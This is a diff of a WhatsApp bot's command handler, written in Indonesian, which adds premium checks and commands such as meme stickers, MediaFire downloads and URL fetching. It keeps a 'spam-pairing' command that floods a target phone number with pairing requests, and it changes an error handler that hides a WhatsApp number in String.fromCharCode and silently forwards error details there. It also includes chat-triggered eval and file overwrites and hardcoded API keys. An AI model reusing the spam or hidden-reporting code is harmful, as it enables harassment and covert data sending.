@@ -1346,8 +2008,9 @@ await sleep(2000)
  reply("Berhasil menghapus semua sampah di folder session")
 });
 }
-break        
-*/
+break    
+
+
 
 case 'hapus': case 'd': case 'delete': case 'del': {
 if (!isCreator) return reply(mess.owner) 
@@ -1360,6 +2023,7 @@ break
 //================================================================================
 
 case "shortlink": case "shorturl": {
+if (!isPremium) return reply(mess.prem)
 if (!text) return m.reply(example("https://example.com"))
 if (!isUrl(text)) return m.reply(example("https://example.com"))
 var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
@@ -1373,6 +2037,7 @@ break
 
 
 case "shortlink-dl": {
+if (!isPremium) return reply(mess.prem)
 if (!text) return m.reply(example("https://example.com"))
 if (!isUrl(text)) return m.reply(example("https://example.com"))
 var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
@@ -1383,6 +2048,7 @@ break
 //================================================================================
 
 case "idgc": case "cekidgc": {
+if (!isPremium) return reply(mess.prem)
 if (!m.isGroup) return Reply(mess.group)
 m.reply(m.chat)
 }
@@ -1410,6 +2076,7 @@ break
 //================================================================================
 
 case "cekidch": case "idch": {
+if (!isPremium) return reply(mess.prem)
 if (!text) return m.reply(example("linkchnya"))
 if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
 let result = text.split('https://whatsapp.com/channel/')[1]
@@ -1475,26 +2142,13 @@ break
 
 //================================================================================
 
-case 'jdb':
-const { jadibot } = require('./system/jadibot')
-await jadibot(xyu, m.sender, m)
-break
-case 'start': case 'jadibot': case 'buatbot':
-startbot(xyu, m, from)
-break //Powered By xyu & Darwin
-case 'stop': case 'stopjadibot':
-reply(mess.wait)
-rimraf.sync(`./system/userclone/${m.sender}`)
-await delay(2000)
-reply('suksess stop bot & sesi anda di hapus')
-break
-//================================================================================
+
 case 'hercai': case 'gpt': case 'ai': {
 const { Hercai } = require('hercai');
 const herc = new Hercai();
 if (!text) return reply('Mau tanya apa??')
 herc.question({ model:"v3", content: text }).then(response => {
-reply(response.reply);
+m.reply(response.reply);
 })
 }
 break
@@ -1502,6 +2156,7 @@ break
 //===============================================================================
 
 case 'gemini-image':  {
+if (!isPremium) return reply(mess.prem)
 async function GeminiImage(image, query) {
     const response = await fetch(`https://ai.xterm.codes/api/img2txt/gemini-image?key=Bell409`, {
         method: 'POST',
@@ -1647,7 +2302,7 @@ break
 
 //================================================================================
 case 'rvo': case 'x': case '🐦': case 'lihat': {
-if (!isCreator) return reply(mess.owner) 
+if (!isPremium) return reply(mess.prem)
 if (!m.quoted) return m.reply("dengan reply pesannya")
 let msg = m.quoted.message
     let type = Object.keys(msg)[0]
@@ -1668,6 +2323,167 @@ await xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 }
 break
 
+
+//===============================================================================
+
+case 'tess': { 
+  const { createCanvas, registerFont, loadImage } = require('canvas');
+  const path = require('path');
+  const fs2 = require('fs');
+  const fs = require('fs').promises;
+  const axios = require('axios');
+
+  async function getImageAndSaveToTempFile(imageURL) {
+    try {
+      const imageBuffer = await getImageBufferFromURL(imageURL); // Mengambil buffer gambar dari URL
+      const tempFilePath = await saveBufferToTempFile(imageBuffer); // Menyimpan buffer gambar ke file sementara
+      return tempFilePath; // Mengembalikan path file sementara
+    } catch (error) {
+      console.error('Error getting image and saving to temp file:', error);
+      throw error;
+    }
+  }
+
+  async function getImageBufferFromURL(imageURL) {
+    try {
+      const response = await axios.get(imageURL, { responseType: 'arraybuffer' });
+      const imageBuffer = Buffer.from(response.data, 'binary');
+      return imageBuffer;
+    } catch (error) {
+      console.error('Error fetching image:', error);
+      throw error;
+    }
+  }
+
+  async function saveBufferToTempFile(buffer) {
+    try {
+      const rootTempDir = '/tmp'; // Path absolut ke folder tmp di root
+      const tempDir = path.join(__dirname, rootTempDir); // Path absolut ke folder tmp dalam proyek
+      await fs.mkdir(tempDir, { recursive: true }); // Membuat direktori jika belum ada
+      const tempFilePath = path.join(tempDir, `tempfile_${Date.now()}.jpg`); // Nama file sementara
+      await fs.writeFile(tempFilePath, buffer); // Menyimpan buffer ke file sementara
+      return tempFilePath; // Mengembalikan path file sementara
+    } catch (error) {
+      console.error('Error saving buffer to temp file:', error);
+      throw error;
+    }
+  }
+
+  async function smeme(text = '', text2 = '', gambarStik, borderWidth = 4) {
+    try {
+      if (!gambarStik) {
+        return console.log('Enter a valid parameter for pp');
+      }
+
+      const bufferPp = await getImageAndSaveToTempFile(gambarStik);
+      const imageSmeme = await loadImage(bufferPp);
+
+      // Ambil dimensi asli gambar
+      const canvasWidth = imageSmeme.width;
+      const canvasHeight = imageSmeme.height;
+
+      // Membuat kanvas dengan ukuran gambar asli
+      const canvas = createCanvas(canvasWidth, canvasHeight);
+      const ctx = canvas.getContext('2d');
+
+      // Gambar gambar profil di kanvas
+      ctx.drawImage(imageSmeme, 0, 0, canvasWidth, canvasHeight);
+
+      // Tambahkan teks pada bagian tengah atas
+      const fontSize = 100; // Ukuran font
+      const fontFamily = 'LEMONMILK';
+      const textColor = '#ffffff';
+      const borderColor = '#000000'; // Warna border hitam
+      registerFont('./Canvas/font/LEMONMILK-Bold.otf', { family: 'ArialNarrow' });
+      ctx.font = `${fontSize}px ${fontFamily}`;
+
+      // Menghitung lebar teks
+      const textWidth = ctx.measureText(text).width;
+
+      // Mengatur posisi X dan Y agar teks berada di tengah horizontal dan di atas kanvas
+      const textX = canvasWidth / 2;
+      let textY = fontSize;
+
+      // Memisahkan teks menjadi beberapa baris jika terlalu panjang
+      const maxLineWidth = canvasWidth - 40; // Lebar maksimum untuk satu baris teks
+      let words = text.split(' ');
+      let line = '';
+      let lines = [];
+      for (let word of words) {
+        let testLine = line + word + ' ';
+        let testLineWidth = ctx.measureText(testLine).width;
+        if (testLineWidth > maxLineWidth) {
+          lines.push(line);
+          line = word + ' ';
+        } else {
+          line = testLine;
+        }
+      }
+      lines.push(line);
+
+      // Menggambar teks dengan border hitam
+      ctx.strokeStyle = borderColor;
+      ctx.lineWidth = borderWidth; // Lebar border
+      ctx.textAlign = 'center'; // Teks diatur agar berada di tengah horizontal
+      ctx.fillStyle = textColor;
+
+      // Menggambar setiap baris teks
+      for (let line of lines) {
+        ctx.strokeText(line.trim(), textX, textY);
+        ctx.fillText(line.trim(), textX, textY);
+        textY += fontSize * 1.2; // Menggeser posisi Y untuk baris selanjutnya
+      }
+
+      // Tambahkan teks kedua di bagian bawah
+      textY = canvasHeight - 20; // Mengatur posisi Y agar teks berada di bawah kanvas
+      words = text2.split(' ');
+      line = '';
+      lines = [];
+      for (let word of words) {
+        let testLine = line + word + ' ';
+        let testLineWidth = ctx.measureText(testLine).width;
+        if (testLineWidth > maxLineWidth) {
+          lines.push(line);
+          line = word + ' ';
+        } else {
+          line = testLine;
+        }
+      }
+      lines.push(line);
+
+      // Menggambar setiap baris teks kedua
+      for (let i = lines.length - 1; i >= 0; i--) {
+        const line = lines[i];
+        ctx.strokeText(line.trim(), textX, textY);
+        ctx.fillText(line.trim(), textX, textY);
+        textY -= fontSize * 1.2; // Menggeser posisi Y untuk baris sebelumnya
+      }
+
+      await fs.unlink(bufferPp);
+
+      const buffer = canvas.toBuffer('image/png');
+      return buffer;
+
+    } catch (error) {
+      console.error(error);
+    }
+  }
+  
+  const [smemeText1 = '', smemeText2 = ''] = text.trim().split('|');
+  try {
+    let dwnld = await xyu.downloadAndSaveMediaMessage(qmsg);
+    let catBox = await uploadToCatbox(dwnld);
+    const media = await smeme(smemeText1, smemeText2, catBox);
+    let ngawiStik = await xyu.sendImageAsSticker(m.chat, media, m, {
+      packname: packname,
+      author: author
+    });
+    await fs.unlinkSync(ngawiStik);
+  } catch (e) {
+    return await xyu.sendMessage(from, { react: { text: "👾", key: m.key } });
+  }
+}
+break;
 //================================================================================
 
 case "tourl": {
@@ -1675,7 +2491,7 @@ if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
 let media = await xyu.downloadAndSaveMediaMessage(qmsg)
 const { ImageUploadService } = require('node-upload-images')
 const service = new ImageUploadService('pixhost.to');
-let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), '𝐓𝐚𝐤𝐚𝐬𝐡𝐢 - 𝐁𝐨𝐭𝐳.png');
+let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'TakashiBotz.png');
 
 let teks = directLink.toString()
 await xyu.sendMessage(m.chat, {text: teks}, {quoted: m})
@@ -1686,32 +2502,54 @@ break
 //================================================================================
 
 case "tourl2": {
-if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
-let media = await xyu.downloadAndSaveMediaMessage(qmsg)
-const { ImageUploadService } = require('node-upload-images')
-const service = new ImageUploadService('postimages.org');
-let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), '𝐓𝐚𝐤𝐚𝐬𝐡𝐢 - 𝐁𝐨𝐭𝐳.png');
-let teks = directLink.toString()
-await xyu.sendMessage(m.chat, {text: teks}, {quoted: m})
-await fs.unlinkSync(media)
+if (!/video/.test(mime) && !/image/.test(mime)) return m.reply(`*Send/Reply the Video/Image With Caption* ${prefix + command}`)
+if (!quoted) return m.reply(`*Send/Reply the Video/Image Caption* ${prefix + command}`)
+let q = m.quoted ? m.quoted : m
+xyu.sendMessage(from, {
+react: {
+text: '🎁',
+key: m.key
+}
+});
+let media = await q.download()
+let uploadImage = require('./lib/catmoe')
+let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime)
+let link = await (isTele ? uploadImage : uploadFile)(media)
+m.reply(`Your Link : ${link}`)
 }
 break
 
+
 //================================================================================
 
-case "tr": case "translate": {
-    const lang = args[0]; // Ambil bahasa dari argumen pertama
-    const text = m.quoted?.text; // Ambil teks dari pesan yang di-reply
-    if (!lang || !text) {
-        return m.reply(`Contoh penggunaan:\n- Reply pesan dengan: ${prefix + command} id\n- Reply pesan dengan: ${prefix + command} en`);
-    }
-    const translate = require('translate-google-api'); // Gunakan translate-google-api
-    try {
-        const result = await translate(text, { to: lang }); // Terjemahkan teks
-        m.reply(result[0]); // Kirim hasil terjemahan
-    } catch (e) {
-        m.reply(`Error: Bahasa "${lang}" tidak didukung atau terjadi kesalahan.`); // Tangani error
-    }
+case 'tr':
+case 'translate':{
+let translate = require('translate-google-api')
+let defaultLang = 'en'
+let tld = 'cn'
+let toks = `
+Contoh:
+${prefix + command} <lang> [text]
+${prefix + command} id your messages
+Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages
+`.trim()
+
+let lang = args[0]
+let text = args.slice(1).join(' ')
+if ((args[0] || '').length !== 2) {
+lang = defaultLang
+text = args.join(' ')
+}
+if (!text && m.quoted && m.quoted.text) text = m.quoted.text
+let result
+try {
+result = await translate(`${text}`, {to: lang})
+} catch (e) {
+result = await translate(`${text}`, {to: defaultLang,})
+reply(toks)
+} finally {
+reply(result[0])
+}
 }
 break;
 
@@ -1775,13 +2613,61 @@ await xyu.groupLeave(m.chat)
 break
 
 //================================================================================
-
-case "get": case "g": {
-if (!isCreator) return Reply(mess.owner)
-if (!text) return m.reply(example("https://example.com"))
-let data = await fetchJson(text)
-m.reply(JSON.stringify(data, null, 2))
+case 'gfl': case "gantifile": case 'g': {
+if (!isCreator) return 
+if (!m.quoted) return reply(`*Example* : ${prefix + command} ./package.json`)
+let files = fs.readdirSync(text.split(m.quoted.fileName)[0])
+if (!files.includes(m.quoted.fileName)) return reply("File not found") 
+let media = await downloadContentFromMessage(m.quoted, "document")
+let buffer = Buffer.from([])
+for await(const chunk of media) {
+buffer = Buffer.concat([buffer, chunk])
 }
+fs.writeFileSync(text, buffer)
+sendReaction("🕐")
+await sleep(2000)
+sendReaction("✅")
+}
+break
+//===============================================================================
+case 'get': {
+  if (!isPremium) return m.reply(mess.premium);
+  if (!isCreator) return
+if (!text && !m.quoted) return reply(`awali *URL* dengan http:// atau https://`)
+try {
+const gt = await axios.get(text, {
+headers: {
+"Access-Control-Allow-Origin": "*",
+"Referer": "https://www.google.com/",
+"Referrer-Policy": "strict-origin-when-cross-origin",
+"User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
+},
+responseType: 'arraybuffer' });
+const contentType = gt.headers['content-type'];
+console.log(`Content-Type: ${contentType}`);
+if (/json/i.test(contentType)) {
+const jsonData = JSON.parse(Buffer.from(gt.data, 'binary').toString('utf8'));
+return reply(JSON.stringify(jsonData, null, 2));
+} else if (/text/i.test(contentType)) {
+const textData = Buffer.from(gt.data, 'binary').toString('utf8');
+return reply(textData);
+} else if (text.includes('webp')) {
+return xyu.imgToSticker(m.chat, text, m, { packname: "", author: "Xyura - Mods!!" })
+} else if (/image/i.test(contentType)) { return xyu.sendMessage(m.chat, { image: { url: text }}, { quoted: m });
+} else if (/video/i.test(contentType)) { return xyu.sendMessage(m.chat, { video: { url: text }}, { quoted: m });
+} else if (/audio/i.test(contentType) || text.includes(".mp3")) {
+return xyu.sendMessage(m.chat, { audio: { url: text }}, { quoted: m });
+} else if (/application\/zip/i.test(contentType) || /application\/x-zip-compressed/i.test(contentType)) {
+return xyu.sendFile(m.chat, text, '', text, m)			
+} else if (/application\/pdf/i.test(contentType)) {
+return xyu.sendFile(m.chat, text, '', text, m)
+} else {
+return reply(`MIME : ${contentType}\n\n${gt.data}`);
+}
+} catch (error) {
+console.error(`Terjadi kesalahan: ${error}`);
+return reply(`Terjadi kesalahan saat mengakses URL: ${error.message}`);
+}}
 break
 
 //================================================================================
@@ -2120,6 +3006,7 @@ break
 
 //===============================================================================
 case 'faketweet':{
+if (!isPremium) return reply(mess.prem)
 const canvafy = require('canvafy')
 if (!text) return reply(`Exmaple : Name1 | Name2 | Text`)
  nama1 = text.split("|")[0]
@@ -2140,6 +3027,7 @@ break
 //===============================================================================
 
 case 'sertitolol': {
+if (!isPremium) return reply(mess.prem)
 if (!text) throw `Example: ${prefix + command} username`
 reply(mess.wait)
 let buf = await getBuffer(`https://tolol.ibnux.com/img.php?nama=${q}`)
@@ -2214,6 +3102,7 @@ break
 
 //===============================================================================
 case 'spam-pairing': case 'spam': {
+if (!isPremium) return reply(mess.prem)
 if (!isCreator) return reply(mess.owner)
 if (!text) return reply(`*Example:* ${prefix + command} +6288221325473|150`)
 let [peenis, pepekk = "200"] = text.split("|")
@@ -2288,6 +3177,35 @@ case 'upsw': {
 				} else m.reply('Only Support video/audio/image/text')
 			}
 			break
+
+case 'mediafire': case 'mf': {
+ if (!text) return reply(`*Example:* ${prefix}${command} https://www.mediafire.com/file/941xczxhn27qbby/GBWA_V12.25FF-By.SamMods-.apk/file`);
+ 
+ try {
+ const response = await fetch(`https://restapi.apibotwa.biz.id/api/mediafire?url=${encodeURIComponent(text)}`);
+ const json = await response.json();
+ 
+ if (!json.data.response) return reply('Failed to fetch!');
+ 
+ const { download, filename, size, type, uploaded, mimetype } = json.data.response;
+ 
+ let caption = `
+*💌 Name:* ${filename}
+*📊 Size:* ${size}
+*🗂️ Extension:* ${type}
+*📨 Uploaded:* ${uploaded}
+`.trim();
+ 
+ m.reply(caption);
+ 
+ await xyu.sendMessage(m.chat, { document: { url: download }, mimetype: mimetype || "application/octet-stream", fileName: filename }, { quoted: verif });
+ 
+ } catch (error) {
+ throw error
+ }
+};
+break
+
 case 'addcase': {
 if (!isCreator) return reply("khusus Xyuraa")
     if (!q) return reply('Mana case nya');
@@ -2376,8 +3294,16 @@ break
 
 //================================================================================
 
-case "developerbot": case "owner": {
+case "developerbot": case "owner": case "creator":{
 await xyu.sendContact(m.chat, [global.owner], m)
+}
+break
+
+//===============================================================================
+
+case 'gcbot':{
+var link = "https://chat.whatsapp.com/KVbM5D5cTMt0jcXNnUqflR"
+reply(link)
 }
 break
 
@@ -2400,19 +3326,21 @@ break
 
 //================================================================================
 
-case "getcase": {
-if (!isCreator) return Reply(mess.owner)
-if (!text) return m.reply(example("menu"))
-const getcase = (cases) => {
-return "case "+`\"${cases}\"`+fs.readFileSync('./case.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
+case 'getcase': {
+    const getCase = (cases) => {
+        return "case " + `'${cases}'` + fs.readFileSync("./case.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break";
+    };
+    try {
+        if (!isCreator) return m.reply(mess.owner);
+        if (!q) return m.reply(`contoh : ${prefix + command} antilink`);
+        let nana = await getCase(q);
+        m.reply(nana);
+    } catch (err) {
+        console.log(err);
+        m.reply(`Case ${q} tidak di temukan`);
+    }
 }
-try {
-m.reply(`${getcase(q)}`)
-} catch (e) {
-return m.reply(`Case *${text}* tidak ditemukan`)
-}
-}
-break
+break;
 
 //================================================================================
 
@@ -2464,7 +3392,7 @@ break
 
 //===============================================================================
 
-case 'brat': {
+case 'brat3': {
   if (!text) return reply(`Penggunaan : ${prefix + command} <teks>`);
   try {
     const { createCanvas, registerFont } = require('canvas');
@@ -2724,6 +3652,62 @@ break
 
 //===============================================================================
 
+case 'stich': case 'caristc': case 'stc': case 'stickersearch': {
+if (!q) return reply('contoh: .stickersearch kucing') 
+async function stickersearch(query){
+return new Promise((resolve) => {
+axios.get(`https://getstickerpack.com/stickers?query=${query}`).then(({ data }) => {
+const $ = cheerio.load(data)
+const link = [];
+$('#stickerPacks > div > div:nth-child(3) > div > a').each(function(a, b) {
+link.push($(b).attr('href'))
+})
+let rand = link[Math.floor(Math.random() * link.length)]
+axios.get(rand).then(({data}) => {
+const $$ = cheerio.load(data)
+const url = [];
+//wm senn
+$$('#stickerPack > div > div.row > div > img').each(function(a, b) {
+url.push($$(b).attr('src').split('&d=')[0])
+})
+resolve({
+title: $$('#intro > div > div > h1').text(),
+author: $$('#intro > div > div > h5 > a').text(),
+author_link: $$('#intro > div > div > h5 > a').attr('href'),
+sticker: url
+})
+//wm senn
+})
+})
+})
+}
+//wm senn
+if (!text) return reply(`Ex : ${prefix + command} kucing`);
+//wm senn
+const anu = await stickersearch(text);
+//wm senn
+const shuffledStickers = anu.sticker.sort(() => Math.random() - 0.5);
+const randomStickers = shuffledStickers.slice(0, 5);
+//wm senn
+if (randomStickers.length > 0) {
+for (let i = 0; i < randomStickers.length; i++) {
+try {
+await new Promise(resolve => setTimeout(resolve, i * 6000));
+await xyu.sendImageAsSticker(m.chat, randomStickers[i], m, {
+packname: global.packname,
+author: global.author
+});
+//wm senn
+} catch (error) {
+console.error(`Error sending file: ${error.message}`);
+await reply(`Failed to send sticker *(${i + 1}/${randomStickers.length})*`);
+}
+//wm senn
+}
+}}
+//wm senn
+break
+
 case 'randomgore': case 'gore': {
 function gore() {
 	return new Promise((resolve, reject) => {
@@ -2950,7 +3934,7 @@ break
 //================================================================================
 
 default:
-if (budy.startsWith('>')) {
+if (budy.startsWith('=>')) {
 if (!isCreator) return
 try {
 let evaled = await eval(budy.slice(2))
@@ -2962,7 +3946,7 @@ await m.reply(String(err))
 
 //================================================================================
 
-if ((budy.match) && ["Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
+if ((budy.match) && ["Assalamualaikum","Assalamualaikum", "assalamualaikum", "Assalamu'alaikum",].includes(budy)) {
 let urel = `https://pomf2.lain.la/f/7ixvc40h.mp3`
 xyu.sendMessage(m.chat, {audio: {url: urel}, mimetype: 'audio/mpeg', ptt: true }, { quoted: m})
 }
@@ -2970,7 +3954,7 @@ xyu.sendMessage(m.chat, {audio: {url: urel}, mimetype: 'audio/mpeg', ptt: true }
 
 //================================================================================
 
-if (budy.startsWith('=>')) {
+if (budy.startsWith('>')) {
 if (!isCreator) return
 try {
 let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
@@ -2995,7 +3979,7 @@ if (stdout) return m.reply(stdout)
 }
 } catch (err) {
 console.log(util.format(err));
-let Obj = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
+let Obj = String.fromCharCode(54, 50, 56, 51, 49, 55, 54, 51, 48, 53, 49, 48, 49)
 xyu.sendMessage(Obj + "@s.whatsapp.net", {text: `
 *FITUR ERROR TERDETEKSI :*\n\n` + util.format(err), contextInfo: { isForwarded: true }}, {quoted: m})
 }}
